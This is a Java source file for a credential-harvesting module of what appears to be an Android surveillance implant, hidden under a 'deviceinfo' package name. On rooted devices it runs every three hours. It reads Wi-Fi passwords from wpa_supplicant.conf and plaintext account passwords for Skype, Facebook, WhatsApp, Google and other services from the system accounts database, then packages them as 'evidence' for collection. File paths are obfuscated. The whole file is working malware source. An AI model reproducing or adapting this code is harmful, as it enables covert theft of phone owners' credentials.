package com.android.deviceinfo.module;

import java.io.File;
import java.io.FileInputStream;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;

import android.database.Cursor;

import com.android.deviceinfo.Status;
import com.android.deviceinfo.auto.Cfg;
import com.android.deviceinfo.conf.ConfModule;
import com.android.deviceinfo.db.GenericSqliteHelper;
import com.android.deviceinfo.db.RecordVisitor;
import com.android.deviceinfo.evidence.EvidenceReference;
import com.android.deviceinfo.evidence.EvidenceType;
import com.android.deviceinfo.evidence.Markup;
import com.android.deviceinfo.file.Path;
import com.android.deviceinfo.util.ByteArray;
import com.android.deviceinfo.util.Check;
import com.android.deviceinfo.util.StringUtils;
import com.android.deviceinfo.util.WChar;
import com.android.m.M;

public class ModulePassword extends BaseModule {

	private static final String TAG = "ModulePassword"; //$NON-NLS-1$
	private static final int ELEM_DELIMITER = 0xABADC0DE;
	private Markup markupPassword;
	private HashMap<Integer, String> lastPasswords;
	private static HashMap<String, Integer> services = new HashMap<String, Integer>();

	@Override
	protected boolean parse(ConfModule conf) {
		if (Status.self().haveRoot()) {
			services.put("skype", 0x02);
			services.put("facebook", 0x03);
			services.put("twitter", 0x04);
			services.put("google", 0x05);
			services.put("whatsapp", 0x07);
			services.put("mail", 0x09);
			services.put("linkedin", 0x0a);
			services.put("wifi", 0x0b);

			return true;
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (parse), don't have root, bailing out");
			}
			return false;
		}
	}

	@Override
	protected void actualStart() {
		// every three hours, check.
		setPeriod(180 * 60 * 1000);
		setDelay(200);

		markupPassword = new Markup(this);
		lastPasswords = markupPassword.unserialize(new HashMap<Integer, String>());
	}

	@Override
	protected void actualGo() {

		RecordVisitor passwordVisitor = new RecordVisitor() {
			EvidenceReference evidence = new EvidenceReference(EvidenceType.PASSWORD);
			boolean needToSerialize = false;

			@Override
			public void close() {
				if (needToSerialize) {
					markupPassword.serialize(lastPasswords);
				}
				evidence.close();
			}

			@Override
			public long cursor(Cursor cursor) {
				int jid = cursor.getInt(0);
				String name = cursor.getString(1);
				String type = cursor.getString(2);
				String password = cursor.getString(3);
				String service = getService(type);

				String value = name + "_" + type + "_" + password;

				if (Cfg.DEBUG) {
					Check.log(TAG + " (dumpPasswordDb): id : " + jid + " name : " + name + " type: " + type + " pw: "
							+ password);
				}

				if (!StringUtils.isEmpty(password)) {

					if (lastPasswords.containsKey(jid) && lastPasswords.get(jid).equals(value)) {
						return jid;
					} else {
						lastPasswords.put(jid, value);
						needToSerialize = true;
					}

					addToEvidence(evidence, name, type, password, service);

				}

				return jid;
			}
		};

		dumpWifi();
		dumpAccounts(passwordVisitor);

	}

	private void dumpWifi() {
		String filename = M.e("/data/misc/wifi/wpa_supplicant.conf");
		if (!Path.unprotect(filename, 2, false)) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (dumpWifi) no passwords found");
			}
			return;
		}
		List<String> lines = StringUtils.readFileLines(filename);
		String ssid = "";
		String psk = "";
		EvidenceReference evidence = new EvidenceReference(EvidenceType.PASSWORD);
		for (String line : lines) {
			if (line.contains("ssid")) {
				ssid = getValue(line);
				if (Cfg.DEBUG) {
					Check.log(TAG + " (dumpWifi) ssid = %s", ssid);
				}
			} else if (line.contains("psk")) {
				psk = getValue(line);
				if (Cfg.DEBUG) {
					Check.log(TAG + " (dumpWifi) psk = %s", psk);
				}
				addToEvidence(evidence, ssid, "SSID", psk, "Wifi");
			}
		}
		evidence.close();

	}

	private String getValue(String line) {
		String[] parts = line.split("=");
		if (parts.length == 2) {
			return parts[1];
		}
		return null;
	}

	public static void dumpAccounts(RecordVisitor visitor) {
		// h_0=/data/system/
		// h_1=/data/system/users/0/
		// h_2=accounts.db
		String pathUser = M.e("/data/system/users/0/");
		String pathSystem = M.e("/data/system/");
		String file = M.e("accounts.db");

		String dbFile = "";

		if (!Path.unprotect(pathUser, 3, false)) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (dumpAccounts) error: cannot open path");
			}
			return;
		}

		GenericSqliteHelper helper = GenericSqliteHelper.openCopy(pathSystem, file);
		if (helper == null) {
			helper = GenericSqliteHelper.openCopy(pathUser, file);
		}

		if (helper == null) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (dumpPasswordDb) ERROR: cannot open db");
			}
		}

		// h_4=accounts
		String table = M.e("accounts");

		// h_5=_id
		// h_6=name
		// h_7=type
		// h_8=password
		String[] projection = { M.e("_id"), M.e("name"), M.e("type"), M.e("password ") };
		visitor.projection = projection;

		helper.traverseRecords(table, visitor);

	}

	public static void dumpAddressBookAccounts() {

	}

	private static String getService(String type) {

		Iterator<String> iter = services.keySet().iterator();
		while (iter.hasNext()) {
			String key = iter.next();
			if (type.contains(key)) {
				return key;
			}
		}
		return "service";

	}

	static int getServiceId(String type) {

		Iterator<String> iter = services.keySet().iterator();
		while (iter.hasNext()) {
			String key = iter.next();
			if (type.contains(key)) {
				return services.get(key);
			}
		}

		return 0;

	}

	@Override
	protected void actualStop() {

	}

	private void addToEvidence(EvidenceReference evidence, String name, String type, String password, String service) {
		evidence.write(WChar.getBytes(type, true));
		evidence.write(WChar.getBytes(name, true));
		evidence.write(WChar.getBytes(password, true));
		evidence.write(WChar.getBytes(service, true));
		evidence.write(ByteArray.intToByteArray(ELEM_DELIMITER));
	}

}
